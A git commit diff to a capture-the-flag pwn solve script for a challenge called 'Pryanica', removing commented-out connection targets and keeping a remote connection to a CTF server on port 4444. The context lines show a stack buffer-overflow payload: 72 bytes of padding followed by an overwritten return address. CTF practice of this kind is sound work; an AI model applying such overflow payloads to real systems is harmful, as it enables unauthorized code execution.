d4959ea08631c6c7c595d4d4ed1fa97f3102302a
555KIV <a555kiv.master2015@yandex.ru>
2024-05-12 14:00:01 +0300

    Fix

--- pwn/Пряница/SolvePryanica.py
+++ pwn/Пряница/SolvePryanica.py
@@ -7,10 +7,8 @@ def little_endian(num):
 	return struct.pack('<Q', num)
 
 
-#p = process('./Pryanica')
-#p = remote('92.53.99.249',4444)
 p = remote('tulactf.ru',4444)
-#p = remote('88.218.60.249',4444)
+
 
 junk = b'A'*72
 ret_addr = p64(0x00401163)
